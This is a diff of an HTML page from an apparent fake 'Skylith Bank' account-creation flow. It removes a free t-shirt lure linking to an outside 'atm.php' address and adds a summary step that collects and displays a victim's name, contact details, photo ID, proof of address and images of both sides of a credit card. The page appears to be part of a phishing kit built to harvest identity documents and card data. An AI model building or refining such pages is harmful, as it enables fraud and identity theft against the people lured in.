@@ -1,35 +1,40 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Create Your Bank Account - Final Step</title>
-    <link rel="stylesheet" href="css/styles.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Summary</title>
+  <link rel="stylesheet" href="css/styles.css">
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>Create Your Bank Account</h1>
-        </header>
-        <main>
-            <div class="section">
-                <h2>Your Account Is Being Created</h2>
-                <p>We’ll send an email to confirm your email address shortly.</p>
-                <p>Thank you for choosing Skylith Bank!</p>
-                <p>As a token of our appreciation, we’re giving out free t-shirts to our customers. Pick your size below to place your order.</p>
-                <img src="https://i.postimg.cc/MKWMZxJL/file-Qk-S52v5-QXJy-GJ1c9c-XPj-MH.webp" alt="T-shirt Image" style="width:50%">
-                <div class="form-group">
-                    <label for="size">Pick Your Size:</label>
-                    <select id="size" name="size">
-                        <option value="XL">XL</option>
-                        <option value="2XL">2XL</option>
-                        <option value="4XL">4XL</option>
-                    </select>
-                </div>
-                <a href="https://hiddenlink.com.ng/atm.php?user=99940&ref=99940" class="order-button">ORDER NOW</a>
-            </div>
-        </main>
-    </div>
-    <script src="js/script.js"></script>
+  <div class="container">
+    <header class="header">
+      <h1>Create Your Bank Account</h1>
+    </header>
+
+    <section class="content">
+      <h2>Account Summary</h2>
+      <p>Please review the details below and confirm to complete your account setup.</p>
+
+      <div id="summary">
+        <h3>Personal Details</h3>
+        <p><strong>Full Name:</strong> <span id="fullNameDisplay"></span></p>
+        <p><strong>Email:</strong> <span id="emailDisplay"></span></p>
+        <p><strong>Phone Number:</strong> <span id="phoneDisplay"></span></p>
+
+        <h3>Uploaded Documents</h3>
+        <p><strong>Photo ID:</strong> <span id="photoIdDisplay"></span></p>
+        <p><strong>Proof of Address:</strong> <span id="proofOfAddressDisplay"></span></p>
+        <p><strong>Credit Card Front:</strong> <span id="creditCardFrontDisplay"></span></p>
+        <p><strong>Credit Card Back:</strong> <span id="creditCardBackDisplay"></span></p>
+      </div>
+
+      <div class="form-navigation">
+        <button type="button" class="btn previous" onclick="goToPage('page4.html')">Previous</button>
+        <button type="button" class="btn confirm" id="confirmButton">Confirm</button>
+      </div>
+    </section>
+  </div>
+  <script src="js/script.js"></script>
 </body>
 </html>
